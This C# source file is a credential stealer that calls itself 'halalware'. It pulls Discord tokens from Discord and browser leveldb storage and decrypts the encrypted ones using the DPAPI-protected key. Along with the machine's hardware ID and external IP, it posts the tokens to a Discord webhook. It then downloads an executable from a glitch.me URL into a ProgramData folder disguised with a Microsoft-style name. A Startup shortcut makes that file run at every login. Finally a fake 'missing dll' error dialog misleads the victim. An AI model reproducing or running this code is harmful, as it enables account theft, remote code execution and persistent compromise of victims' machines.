using Microsoft.VisualBasic.Logging;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using code_get;
using System.Diagnostics;
using System.Management;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

public partial class background
{
    public Encoding enc = Encoding.GetEncoding("UTF-8");
    public string Dir = Directory.GetCurrentDirectory();
    public bool write_log;
    public string data;
    public static string webhook = "WEB HOOK";
    public delegate void FunctionInvoker();
    internal class Engine
    {
        private string AppDataRoaming { get; } = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private string AppDataLocal { get; } = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public string tempdata;
        private string EncryptedKey { get; set; }
        private Regex EncryptedKeyRegex { get; set; }
        private Regex NormalRegexPattern { get; set; }
        private Regex EncryptedRegexPattern { get; set; }
        private List<string> NormalTokens { get; set; }
        private List<string> EncryptedTokens { get; set; }
        private List<string> DecryptedTokens { get; set; }
        private Dictionary<string, string> DiscordPathInformation { get; set; }
        private Dictionary<string, string> DiscordTokenData { get; set; }

        public void Run()
        {
            this.EncryptedKeyRegex = new Regex("(?<key>[a-zA-Z0-9\\/\\+]{356})\"\\}\\}");
            this.NormalRegexPattern = new Regex(@"(?:[\w-]{24}([.])[\w-]{6}\1[\w-]{27}|mfa[.]\w{84})");
            this.EncryptedRegexPattern = new Regex("dQw4w9WgXcQ:[^\"]*");
            this.NormalTokens = new List<string>();
            this.EncryptedTokens = new List<string>();
            this.DecryptedTokens = new List<string>();
            this.DiscordPathInformation = new Dictionary<string, string>()
            {
                { "Discord",          AppDataRoaming + @"\discord\Local Storage\leveldb" },
                { "Discord(PTB)",     AppDataRoaming + @"\discordptb\Local Storage\leveldb" },
                { "Discord(Canary)",  AppDataRoaming + @"\discordcanary\Local Storage\leveldb" },
                { "Browser(Brave)",   AppDataLocal   + @"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" },
                { "Browser(Chrome)",  AppDataLocal   + @"\Google\Chrome\User Data\Default\Local Storage\leveldb" },
                { "Browser(Iridium)", AppDataLocal   + @"\Iridium\User Data\Default\Local Storage\leveldb"}
            };

            List<FunctionInvoker> functions = new List<FunctionInvoker>()
            {
                AcquireEncryptedKey,
                ExtractTokens,
                SendTokens
            };

            functions.ForEach(currentFunction => currentFunction.Invoke());
        }

        private void AcquireEncryptedKey()
        {
            try
            {
                string localStateContent = File.ReadAllText(AppDataRoaming + @"\discord\Local State");
                this.EncryptedKey = this.EncryptedKeyRegex.Match(localStateContent).Groups["key"].Value;
            }
            catch (DirectoryNotFoundException)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Cannot find {AppDataRoaming}\\discord\\Local State");
            }
        }

        private void ExtractTokens()
        {
            foreach (KeyValuePair<string, string> currentPath in this.DiscordPathInformation)
            {
                try
                {
                    foreach (string LDBFile in Directory.GetFiles(currentPath.Value, "*ldb"))
                    {
                        string LDBFileContent = File.ReadAllText(LDBFile);

                        foreach (Match normalTokenMatch in this.NormalRegexPattern.Matches(LDBFileContent))
                        {
                            this.NormalTokens.Add($"{currentPath.Key} => {normalTokenMatch.Value}");
                        }

                        foreach (Match encryptedTokenMatch in this.EncryptedRegexPattern.Matches(LDBFileContent))
                        {
                            this.EncryptedTokens.Add(encryptedTokenMatch.Value);
                        }
                    }
                }
                catch (DirectoryNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Directory for {currentPath.Key} not found.");
                    continue;
                }
            }

            for (int i = 0; i < this.EncryptedTokens.Count; i++)
            {
                this.DecryptedTokens.Add(DecryptToken(Convert.FromBase64String(EncryptedTokens[i].Split("dQw4w9WgXcQ:")[1])));
            }
        }

        private byte[] DecryptKey()
        {
            return ProtectedData.Unprotect(Convert.FromBase64String(this.EncryptedKey).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        public string DecryptToken(byte[] buff)
        {
            byte[] EncryptedData = buff.Skip(15).ToArray();
            AeadParameters Params = new(new KeyParameter(DecryptKey()), 128, buff.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }

        private void SendTokens()
        {
            HashSet<string> Ltoken = new HashSet<string>(DecryptedTokens);

            foreach (string Dtoken in Ltoken)
            {
                tempdata += Dtoken+"\n";
            }
        }
    }
    public void start()
    {
        //初期設定
        Form1 form1 = new Form1();
        DateTime dt = DateTime.Now;
        data += dt.ToString("yyyy/MM/dd HH:mm:ss") + "\n";
        //confing stealer
        //string filepath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)+ "\\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\RoamingState\\Horion\\default.h";
        //
        //HWID
        string hardwareId = "";
        try
        {
            foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystemProduct").Get())
                hardwareId = managementBaseObject["UUID"].ToString();
        }
        catch
        {
            Application.Exit();
        }
        data += "HWID : " + hardwareId+"\n";
        //IP
        string externalIpString = new WebClient().DownloadString("https://ipinfo.io/ip");
        var externalIp = IPAddress.Parse(externalIpString);
        data += "IP : " + externalIp.ToString() + "\n";
        //token
        Engine engine = new Engine();
        engine.Run();
        data += "tokens\n"+engine.tempdata+"\n";
        //送信
        HttpClient httpClient = new HttpClient();
        Dictionary<string, string> strs = new Dictionary<string, string>()
        {
            { "content", data },
            { "username", "halalware" },
            { "avatar_url", "https://cdn.discordapp.com/avatars/1132757640867491871/acad78f5bbc5f777975cdd7e1fda249c.webp?size=160" }
        };
        TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook, new
        FormUrlEncodedContent(strs)).GetAwaiter();
        awaiter.GetResult();
        screenshot scr = new screenshot();
        scr.shot();
        //ファイル削除
        File.Delete(Dir + "\\file.png");
        //埋め込み
        Directory.CreateDirectory("C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865");
        WebClient wc = new WebClient();
        wc.DownloadFile("https://cdn.glitch.me/a7b56737-b2b9-43b6-930d-0f7a74bcdb15/get-screen.exe?v=1691098976618", "C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865\\shot.txt");
        wc.Dispose();
        File.WriteAllText("C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865\\run.bat", "call C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865\\shot.txt");
        //スタートアップ登録
        //作成するショートカットのパス
        string shortcutPath = System.IO.Path.Combine("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.lnk");
        //ショートカットのリンク先
        string targetPath = "C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865\\run.bat";

        //WshShellを作成
        IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
        //ショートカットのパスを指定して、WshShortcutを作成
        IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcutPath);
        //リンク先
        shortcut.TargetPath = targetPath;
        //コマンドパラメータ 「リンク先」の後ろに付く
        shortcut.Arguments = "";
        //作業フォルダ
        shortcut.WorkingDirectory = Application.StartupPath;
        //実行時の大きさ 1が通常、3が最大化、7が最小化
        shortcut.WindowStyle = 0;
        //コメント
        shortcut.Description = "run bat";
        //アイコンのパス 自分のEXEファイルのインデックス0のアイコン
        shortcut.IconLocation = "C:\\Windows\\System32\\OkDone_80.png";

        //ショートカットを作成
        shortcut.Save();

        //後始末
        System.Runtime.InteropServices.Marshal.FinalReleaseComObject(shortcut);
        System.Runtime.InteropServices.Marshal.FinalReleaseComObject(shell);
        //後処理
        httpClient.Dispose();
        MessageBox.Show("エラー\n対応しているdllが見つかりませんでした\nソフトを再起動し、もう一度試してください。", "エラー", MessageBoxButtons.OK, MessageBoxIcon.Error);
        Environment.Exit(0);
    }
}
